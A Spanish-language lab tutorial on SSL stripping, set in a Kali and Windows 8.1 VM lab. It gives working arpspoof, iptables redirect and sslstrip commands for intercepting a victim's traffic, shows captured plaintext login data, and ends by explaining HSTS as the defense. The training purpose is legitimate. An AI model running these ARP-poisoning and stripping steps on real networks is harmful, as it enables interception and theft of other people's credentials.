# Práctica de Laboratorio: SSL Stripping

**Objetivo:** Realizar un ataque de SSL Stripping para capturar credenciales que normalmente estarían protegidas por HTTPS. Este ataque es una evolución del ataque MitM básico.

**Escenario:** El atacante ya se ha posicionado como Man-in-the-Middle (por ejemplo, mediante ARP Spoofing). Ahora, cuando la víctima intenta navegar a un sitio seguro (ej: `https://example.com`), el atacante intercepta esta petición. El atacante se conecta al sitio seguro por HTTPS, pero le presenta a la víctima una versión no cifrada (HTTP) del sitio. La víctima, si no se fija en la URL, introducirá sus credenciales en una página HTTP, y el atacante podrá capturarlas en texto plano.

**Máquinas Requeridas:**
*   Una VM con Kali Linux (atacante).
*   Una VM con Windows 8.1 (víctima).

**Herramientas:**
*   `arpspoof` (para el MitM).
*   `sslstrip` (para degradar la conexión de HTTPS a HTTP).

---

## Parte 1: Preparación del Entorno del Atacante (Kali Linux)

### Paso 1: Configurar el Reenvío de IP y las Reglas de Iptables

Para que `sslstrip` funcione, debemos redirigir todo el tráfico HTTP (puerto 80) que interceptemos hacia el puerto donde `sslstrip` estará escuchando (por ejemplo, el puerto 8080).

```bash
# 1. Habilita el reenvío de IP
sudo sysctl -w net.ipv4.ip_forward=1

# 2. Crea una regla en el firewall para redirigir el tráfico del puerto 80 al 8080
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```

---

## Parte 2: Ejecución del Ataque

Para este ataque, necesitarás 3 terminales de Kali distintas.

### Paso 1: Obtener IPs de la Víctima y del Gateway

*   **IP Víctima (Windows 8.1):** `[IP_VICTIMA]`
*   **IP del Gateway (Puerta de enlace):** `[IP_GATEWAY]`

### Terminal 1: Envenenamiento ARP (MitM)

Nos posicionamos en medio de la comunicación entre la víctima y el gateway.

```bash
# Engañar a la víctima para que piense que somos el gateway
sudo arpspoof -i eth0 -t [IP_VICTIMA] [IP_GATEWAY]
```

### Terminal 2: Envenenamiento ARP (MitM) - Dirección Inversa

```bash
# Engañar al gateway para que piense que somos la víctima
sudo arpspoof -i eth0 -t [IP_GATEWAY] [IP_VICTIMA]
```

### Terminal 3: Ejecución de SSLstrip

Iniciamos `sslstrip` para que escuche en el puerto 8080. `sslstrip` se encargará de interceptar las peticiones, conectarse por HTTPS al servidor real, y servir una versión HTTP a la víctima.

```bash
# Inicia sslstrip escuchando en el puerto 8080 y guardando un log
sudo sslstrip -l 8080
```

---

## Parte 3: Verificación y Captura de Credenciales

1.  **En la máquina víctima (Windows 8.1)**, abre un navegador web.
2.  Navega a un sitio web que utilice HTTPS y tenga un formulario de login. **Importante:** Este ataque es antiguo y los navegadores modernos tienen protecciones como HSTS. Necesitarás encontrar un sitio de prueba que no implemente HSTS. Un buen ejemplo para laboratorios es `http://testphp.vulnweb.com/login.php` (aunque empieza por http, el formulario de login puede enviar a https, que es lo que interceptaremos).
3.  **Observa la URL:** Aunque el sitio real funcione sobre HTTPS, gracias a `sslstrip`, tu navegador debería mostrar `http://` y no tener el candado de seguridad.
4.  **Introduce credenciales falsas** en el formulario de login (ej: usuario `test`, contraseña `test1234`).
5.  **Revisa los resultados en Kali:** Vuelve a la terminal donde ejecutas `sslstrip`. Verás en la salida los datos del formulario que has enviado, **en texto plano**.

    ```
    [...]
    POST /login.php HTTP/1.1
    Host: testphp.vulnweb.com
    [...]
    
    uname=test&pass=test1234
    ```

### Limpieza

Cuando termines, detén los tres comandos en las terminales de Kali (`Ctrl+C`) y limpia las reglas del firewall y el reenvío de IP.

```bash
# Limpia las reglas de iptables
sudo iptables -t nat -F

# Desactiva el reenvío de IP
sudo sysctl -w net.ipv4.ip_forward=0
```

## Conclusión y Relevancia Actual

Este ataque demuestra cómo un atacante puede anular la protección de SSL/TLS si el sitio web no está configurado de forma segura. La principal defensa contra SSL Stripping es **HSTS (HTTP Strict Transport Security)**. HSTS es una cabecera que el servidor envía al navegador la primera vez que se conecta, diciéndole: "Durante los próximos X meses, conéctate a mí únicamente a través de HTTPS". De esta forma, el navegador nunca intentará hacer una petición HTTP, frustrando el ataque de `sslstrip` desde el principio.